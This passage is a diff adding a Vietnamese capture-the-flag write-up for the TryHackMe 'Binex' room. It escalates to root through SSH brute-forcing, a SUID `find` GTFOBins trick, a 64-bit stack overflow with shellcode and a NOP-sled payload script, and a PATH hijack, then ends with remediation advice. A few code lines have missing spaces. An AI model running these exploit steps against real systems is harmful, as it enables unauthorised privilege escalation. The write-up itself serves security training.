@@ -1,0 +1,264 @@
+---
+title: 'Binex'
+description: 'Chuỗi ba binary SUID để leo lên root: một kinh điển GTFOBins, một tràn bộ đệm stack 64-bit, và một cú chiếm quyền PATH.'
+date: 2026-09-29
+platform: tryhackme
+room: 'Binex'
+roomUrl: 'https://tryhackme.com/room/binex'
+difficulty: medium
+tags: [linux, privilege escalation, suid, buffer overflow, smb, gtfobins]
+vulnClasses: [SUID Privilege Escalation, Buffer Overflow, PATH Hijacking]
+translation: done
+draft: false
+---
+
+## TryHackMe: Binex — Chuỗi ba binary SUID để lên root
+
+_Lời giải phòng "Binex" (Penetration Tester, mức Trung bình). Ta đi từ một phiên SMB ẩn danh lên tới tận root bằng cách nhảy qua ba người dùng khác nhau, mỗi lần được mở khóa bằng cách lạm dụng một binary SUID khác nhau: một kinh điển GTFOBins, một tràn bộ đệm stack 64-bit, và một cú chiếm quyền PATH._
+
+> Các giá trị flag đã được che. Đây là một phòng luyện tập đã retired trên TryHackMe; không nội dung nào ở đây nhắm vào bất kỳ hệ thống nào khi chưa được cho phép.
+
+---
+
+### TL;DR
+
+<Callout type="tldr">
+
+1. **Trinh sát** — SSH và Samba đang mở.
+2. **Liệt kê** — một phiên SMB null làm lộ bốn người dùng cục bộ qua RID cycling.
+3. **Điểm đặt chân** — người dùng có tên dài nhất (`tryhackme`) có mật khẩu SSH yếu; Hydra tìm ra nó.
+4. **des** — một lệnh `find` SUID thuộc sở hữu của `des` cho ta danh tính của họ (GTFOBins).
+5. **kel** — một lỗi tràn bộ đệm stack 64-bit trong một binary SUID thuộc sở hữu của `kel`.
+6. **root** — một binary SUID-root gọi `ps` bằng tên, nên ta chiếm quyền `PATH`.
+
+</Callout>
+
+<Callout type="insight">
+
+Thông điệp xuyên suốt cả bài: **một binary SUID thuộc sở hữu của người dùng khác là một primitive để di chuyển ngang (lateral movement), không chỉ để lên root.**
+
+</Callout>
+
+---
+
+### 1. Trinh sát
+
+Như thường lệ, bắt đầu bằng quét toàn bộ cổng:
+
+```text
+export IP=<target-ip>
+nmap -sC -sV -p- -T4 --min-rate=1000 $IP
+```
+
+```text
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
+445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu
+```
+
+Ba cổng: SSH và một server Samba. Máy tự xưng là `THM_EXPLOIT`, SMB message signing bị tắt, và một phiên guest/NULL được cho phép. Không thấy dịch vụ web nào, nên SMB là nơi bắt đầu việc liệt kê.
+
+### 2. Liệt kê: tìm người dùng qua SMB
+
+Trước tiên, liệt kê các share — phòng khi có gì đọc được:
+
+```text
+smbclient -L $IP -U anonymous
+```
+
+Chỉ có `print$` và `IPC$`, cả hai đều `NO ACCESS`. Không có file nào để lấy. Nhưng Samba vẫn đưa ta một **danh sách người dùng** ngay cả từ một phiên null, qua RID cycling:
+
+```text
+enum4linux -r $IP
+```
+
+```text
+S-1-22-1-1000 Unix User\kel
+S-1-22-1-1001 Unix User\des
+S-1-22-1-1002 Unix User\tryhackme
+S-1-22-1-1003 Unix User\noentry
+```
+
+Bốn người dùng cục bộ: `kel`, `des`, `tryhackme`, `noentry`. Gợi ý của phòng cho biết người dùng điểm đặt chân là người có **tên dài nhất** — đó là `tryhackme`.
+
+### 3. Điểm đặt chân: brute-force SSH
+
+Ta có một username và một dịch vụ nhận mật khẩu. Đến lượt Hydra và `rockyou.txt`:
+
+```text
+hydra -l tryhackme -P /usr/share/wordlists/rockyou.txt ssh://$IP -I -T 6
+```
+
+```text
+[22][ssh] host: <target-ip>   login: tryhackme   password: thebest
+```
+
+```text
+ssh tryhackme@$IP        # password: thebest
+```
+
+Ta có được một shell với tư cách `tryhackme` trên Ubuntu 18.04. Giờ phần thú vị thật sự — chuỗi leo quyền (privesc) — bắt đầu.
+
+### 4. Từ tryhackme sang des: một lệnh `find` SUID
+
+Ta không thể cứ thế bước vào `/home/des`:
+
+```text
+tryhackme@THM_exploit:/home$ cd des/
+-bash: cd: des/: Permission denied
+```
+
+Nhưng một **binary SUID thuộc sở hữu của** **`des`** chạy _với tư cách_ `des`, bất kể ai khởi chạy nó. Hãy săn riêng các file SUID thuộc sở hữu của người dùng đó:
+
+```text
+find / -type f -perm -04000 -user des -exec ls -ldb {} \; 2>/dev/null
+```
+
+```text
+-rwsr-sr-x 1 des des 238080 /usr/bin/find
+```
+
+Chính `find` là SUID `des`. Và `find` là một mục [GTFOBins](https://gtfobins.github.io/gtfobins/find/) nổi tiếng — tùy chọn `-exec` của nó chạy bất kỳ lệnh nào với quyền của binary:
+
+```text
+/usr/bin/find . -exec /bin/bash -p \; -quit
+```
+
+```text
+bash-4.4$ id
+uid=1002(tryhackme) ... euid=1001(des) egid=1001(des) groups=1001(des),1002(tryhackme)
+```
+
+**UID hiệu lực (effective UID) của ta giờ là** **`des`**. Cờ `-p` quan trọng: nó ngăn Bash bỏ các đặc quyền được nâng lúc khởi động. Với `euid=des`, `/home/des` mở ra:
+
+```text
+cd /home/des && cat flag.txt
+```
+
+Flag chúc mừng ta về cú khai thác SUID (giá trị đã che) và, rất tiện, để lại thông tin đăng nhập của `des`. Trong cùng thư mục đó có hai file chuẩn bị cho giai đoạn tiếp theo: `bof` (một binary SUID thuộc sở hữu của **kel**) và mã nguồn C của nó, `bof64.c`.
+
+### 5. Từ des sang kel: một lỗi tràn bộ đệm stack 64-bit
+
+`/home/des/bof` đọc một chuỗi vào một bộ đệm stack kích thước cố định mà không kiểm tra biên. Đó là một lỗi tràn stack kinh điển. Hai thứ khiến việc khai thác dễ dàng trên máy này: **ASLR coi như bị tắt** (địa chỉ stack ổn định giữa các lần chạy) và stack có quyền thực thi (executable).
+
+#### Bước 1 — xác nhận ta kiểm soát con trỏ lệnh
+
+```text
+gdb ./bof
+(gdb) r < <(python -c 'print("A" * 700)')
+```
+
+```text
+Program received signal SIGSEGV, Segmentation fault.
+rbp  0x4141414141414141
+```
+
+Các ký tự `A` (0x41) của ta đã ghi đè lên các thanh ghi đã lưu. Ta kiểm soát được điểm crash.
+
+#### Bước 2 — tìm offset chính xác
+
+Sinh một mẫu tuần hoàn (cyclic pattern), đưa nó vào, và tra xem nó rơi vào đâu:
+
+```text
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
+# crash the program with that pattern, read the overwritten value, then:
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 4134754133754132
+# [*] Exact match at offset 608
+```
+
+RBP đã lưu nằm ở offset **608**, nên địa chỉ trả về (RIP) theo sau ở 616.
+
+#### Bước 3 — dựng payload
+
+Chiến lược: đưa CPU đáp vào bên trong một **NOP sled** lớn, trượt xuống tới shellcode `execve("/bin//sh")`, tất cả đặt trên stack. Vì ASLR tắt, ta có thể ghi cứng một địa chỉ stack trỏ vào trong sled.
+
+```text
+from structimport pack
+
+# execve("/bin//sh") shellcode
+buf= "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
+
+payload= "\x90" * 400               # NOP sled
+payload+= buf# shellcode
+payload+= "A" * (208 - len(buf))     # pad up to saved RBP (offset 608)
+payload+= "B" * 8                    # overwrite saved RBP
+payload+= pack("<Q", 0x7fffffffe300) # RIP -> somewhere inside the NOP sled
+print(payload)
+```
+
+#### Bước 4 — bắn nó và giữ shell sống
+
+Binary đọc từ stdin, nên ta ống (pipe) payload vào — rồi giữ stdin mở bằng một lệnh `cat` ở cuối để shell tương tác của ta không chết ngay:
+
+```text
+python bo.py > test
+(cat test; cat) | ./bof
+```
+
+```text
+id
+uid=1000(kel) gid=1001(des) groups=1001(des)
+```
+
+Ta đã là `kel`. Nâng cấp lên một TTY đúng nghĩa và đọc chiến lợi phẩm:
+
+```text
+python3 -c "import pty; pty.spawn('/bin/bash')"
+export TERM=xterm
+cd /home/kel && cat flag.txt
+```
+
+Flag thứ hai (đã che) xác nhận lỗi tràn bộ đệm, và một lần nữa file flag để lại thông tin đăng nhập của `kel`. Thư mục này chứa mục tiêu cuối cùng: `exe`, một binary **SUID-root**, và mã nguồn `exe.c` của nó.
+
+### 6. Từ kel lên root: chiếm quyền PATH
+
+Đọc mã nguồn của binary SUID-root chính là thứ phá toang cả máy:
+
+```text
+#include <unistd.h>
+
+void main() {
+    setuid(0);
+    setgid(0);
+    system("ps");   // "ps" is called by NAME, not full path
+}
+```
+
+Nó chạy với tư cách root (`setuid(0)`), rồi gọi `system("ps")`. Điểm mấu chốt: `ps` được phân giải qua `$PATH` — nên nếu _ta_ kiểm soát `ps` nào chạy trước, root sẽ chạy _chương trình của ta_.
+
+```text
+cp /bin/bash /tmp/ps          # our malicious "ps" is just a shell
+export PATH=/tmp:$PATH        # put /tmp at the front of PATH
+cd /home/kel && ./exe
+```
+
+```text
+root@THM_exploit:/home/kel# id
+uid=0(root) ...
+cat /root/root.txt
+```
+
+Shell root, flag cuối cùng (đã che). Xong.
+
+---
+
+### Khắc phục
+
+<Callout type="fix">
+
+Với mỗi mắt xích trong chuỗi này, cách sửa đều nhỏ và đáng nêu trong một báo cáo:
+
+- **`find` SUID** — không bao giờ đặt bit SUID lên các binary dùng chung đa năng. Như chính flag trong game nói: _"Never assign +s to any system executable files. Remember, check GTFOBins."_ (Đừng gán +s cho bất kỳ file thực thi hệ thống nào. Nhớ kiểm tra GTFOBins.)
+- **Tràn bộ đệm** — biên dịch với stack canary, NX, và PIE; bật ASLR; và không phát hành các binary SUID đọc input không giới hạn.
+- **Chiếm quyền PATH** — trong các chương trình đặc quyền, gọi công cụ ngoài bằng **đường dẫn tuyệt đối** (`/bin/ps`) và làm sạch môi trường; tốt hơn nữa là tránh hẳn `system()`.
+
+</Callout>
+
+### Điểm rút ra
+
+- **RID cycling** (`enum4linux -r`) lấy được danh sách username ra khỏi Samba ngay cả từ một phiên null — hãy làm điều này trước khi brute-force một cách mù quáng.
+- **Chuỗi SUID**: một binary SUID thuộc sở hữu của _một người dùng khác_ đưa bạn di chuyển ngang sang người dùng đó. Hãy liệt kê file SUID theo từng chủ sở hữu, không chỉ theo root.
+- Với một **lỗi tràn stack cơ bản** khi ASLR/NX tắt: làm nó crash, lấy offset bằng `pattern_offset.rb`, rồi một NOP sled cộng với một địa chỉ trả về stack ghi cứng là tất cả những gì bạn cần. Giữ shell sống bằng `(cat payload; cat) | ./binary`.
+- Luôn **đọc mã nguồn** của một binary SUID khi có thể — chỉ một tên lệnh tương đối (`system("ps")`) là đủ để kết thúc trận đấu.
+
+Cảm ơn bạn đã đọc. Phòng này được xây bởi DesKel — một chuỗi thực sự thú vị, tưởng thưởng cho việc hiểu _tại sao_ mỗi primitive hoạt động hơn là chỉ chạy một script.
